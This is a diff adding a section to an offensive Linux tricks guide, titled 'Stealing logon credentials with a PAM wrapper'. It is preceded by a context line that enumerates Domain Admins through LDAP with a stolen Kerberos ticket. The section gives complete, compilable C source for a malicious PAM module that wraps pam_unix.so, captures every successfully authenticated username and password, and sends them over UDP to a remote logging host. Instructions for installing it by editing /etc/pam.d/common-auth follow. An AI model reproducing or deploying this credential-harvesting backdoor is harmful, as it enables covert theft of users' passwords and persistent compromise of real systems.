@@ -731,3 +731,181 @@ Copy `cp LINSVR-1\$.ccache` to `/tmp/krb5cc_0`
 List the members of "domain admins".
 
 `ldapsearch -Y GSSAPI -H ldap://10.103.12.52:3268 -b "DC=mydomain,DC=com" -s sub '(&(objectCategory=user)(memberOf=cn=Domain Admins,cn=Users,dc=gci,dc=com))' | grep "distinguishedName:"`
+
+## >> Stealing logon credentials with a PAM wrapper
+
+How to replace the PAM authentication module with your own shared object to send usernames and passwords to a UDP log server.
+
+**First identify the current auth shared object and its location**
+
+![alt text](https://raw.githubusercontent.com/billchaison/Linux-Trix/main/pam00.png)
+
+![alt text](https://raw.githubusercontent.com/billchaison/Linux-Trix/main/pam01.png)
+
+In this example the module name is `pam_unix.so`.  Now find the path to the library and get the export functions.
+
+![alt text](https://raw.githubusercontent.com/billchaison/Linux-Trix/main/pam02.png)
+
+![alt text](https://raw.githubusercontent.com/billchaison/Linux-Trix/main/pam03.png)
+
+Create a source file called `pam_getcreds.c` as follows.  It will be compiled into `pam_getcreds.so` like this.
+
+`gcc -fPIC -shared -o pam_getcreds.so pam_getcreds.c -lpam`
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dlfcn.h>
+#include <security/pam_modules.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+#define PAM_UNIX "pam_unix.so" // original module.
+#define STRLEN 2000
+#define DESTHOST "192.168.1.242" // replace with your logging host IP address.
+#define DESTPORT 1900 // use whatever UDP port you wish.
+
+// pointers to the original Service Module functions.
+int (*func_1)(pam_handle_t *pamh, int flags, int argc, const char **argv) = NULL; // pam_sm_authenticate
+int (*func_2)(pam_handle_t *pamh, int flags, int argc, const char **argv) = NULL; // pam_sm_acct_mgmt
+int (*func_3)(pam_handle_t *pamh, int flags) = NULL; // pam_close_session
+int (*func_4)(pam_handle_t *pamh, int flags) = NULL; // pam_setcred
+int (*func_5)(pam_handle_t *pamh, int flags) = NULL; // pam_chauthtok
+int (*func_6)(pam_handle_t *pamh, int flags) = NULL; // pam_open_session
+
+void *hlib = NULL;
+
+// export the requisite six PAM module functions, intercept calls and pass to the original module.
+PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
+{
+   char str[STRLEN];
+   void *u, *p;
+   int retval, sock;
+   struct sockaddr_in dstaddr;
+
+   if(!hlib)
+   {
+      hlib = dlopen(PAM_UNIX, RTLD_LAZY);
+      if(!hlib) return PAM_AUTH_ERR;
+   }
+   if(!func_1)
+   {
+      *(int**)(&func_1) = dlsym(hlib, "pam_sm_authenticate");
+      if(!func_1) return PAM_AUTH_ERR;
+   }
+   retval = func_1(pamh, flags, argc, argv);
+   if(retval == PAM_SUCCESS)
+   {
+      if(pam_get_item(pamh, PAM_USER, (const void **)&u) == PAM_SUCCESS)
+      {
+         if(pam_get_item(pamh, PAM_AUTHTOK, (const void **)&p) == PAM_SUCCESS)
+         {
+            // a valid username and password has been acquired, log it via UDP.
+            if((strlen((char *)u) + strlen((char *)p)) < STRLEN - 20)
+            {
+               sprintf(str, "user = %s\npass = %s\n", (char *)u, (char *)p);
+               sock = socket(AF_INET, SOCK_DGRAM, 0);
+               if(sock > -1)
+               {
+                  dstaddr.sin_family = AF_INET;
+                  dstaddr.sin_addr.s_addr = inet_addr(DESTHOST);
+                  dstaddr.sin_port = htons(DESTPORT);
+                  sendto(sock, str, strlen(str), MSG_DONTWAIT, (struct sockaddr *)&dstaddr, sizeof(dstaddr));
+                  close(sock);
+               }
+            }
+         }
+      }
+   }
+   return retval;
+}
+
+PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
+{
+   if(!hlib)
+   {
+      hlib = dlopen(PAM_UNIX, RTLD_LAZY);
+      if(!hlib) return PAM_AUTH_ERR;
+   }
+   if(!func_2)
+   {
+      *(int**)(&func_2) = dlsym(hlib, "pam_sm_acct_mgmt");
+      if(!func_2) return PAM_AUTH_ERR;
+   }
+   return func_2(pamh, flags, argc, argv);
+}
+
+PAM_EXTERN int pam_close_session(pam_handle_t *pamh, int flags)
+{
+   if(!hlib)
+   {
+      hlib = dlopen(PAM_UNIX, RTLD_LAZY);
+      if(!hlib) return PAM_AUTH_ERR;
+   }
+   if(!func_3)
+   {
+      *(int**)(&func_3) = dlsym(hlib, "pam_close_session");
+      if(!func_3) return PAM_AUTH_ERR;
+   }
+   return func_3(pamh, flags);
+}
+
+PAM_EXTERN int pam_setcred(pam_handle_t *pamh, int flags)
+{
+   if(!hlib)
+   {
+      hlib = dlopen(PAM_UNIX, RTLD_LAZY);
+      if(!hlib) return PAM_AUTH_ERR;
+   }
+   if(!func_4)
+   {
+      *(int**)(&func_4) = dlsym(hlib, "pam_setcred");
+      if(!func_4) return PAM_AUTH_ERR;
+   }
+   return func_4(pamh, flags);
+}
+
+PAM_EXTERN int pam_chauthtok(pam_handle_t *pamh, int flags)
+{
+   if(!hlib)
+   {
+      hlib = dlopen(PAM_UNIX, RTLD_LAZY);
+      if(!hlib) return PAM_AUTH_ERR;
+   }
+   if(!func_5)
+   {
+      *(int**)(&func_5) = dlsym(hlib, "pam_chauthtok");
+      if(!func_5) return PAM_AUTH_ERR;
+   }
+   return func_5(pamh, flags);
+}
+
+PAM_EXTERN int pam_open_session(pam_handle_t *pamh, int flags)
+{
+   if(!hlib)
+   {
+      hlib = dlopen(PAM_UNIX, RTLD_LAZY);
+      if(!hlib) return PAM_AUTH_ERR;
+   }
+   if(!func_6)
+   {
+      *(int**)(&func_6) = dlsym(hlib, "pam_open_session");
+      if(!func_6) return PAM_AUTH_ERR;
+   }
+   return func_6(pamh, flags);
+}
+```
+
+Copy the PAM wrapper to the folder where `pam_unix.so` resides.
+
+![alt text](https://raw.githubusercontent.com/billchaison/Linux-Trix/main/pam04.png)
+
+Edit `/etc/pam.d/common-auth` and comment out the original line and insert your own module `pam_getcreds.so`.
+
+![alt text](https://raw.githubusercontent.com/billchaison/Linux-Trix/main/pam05.png)
+
+Start the UDP receiver on the logging server and wait for credentials to come in.
+
+![alt text](https://raw.githubusercontent.com/billchaison/Linux-Trix/main/pam06.png)
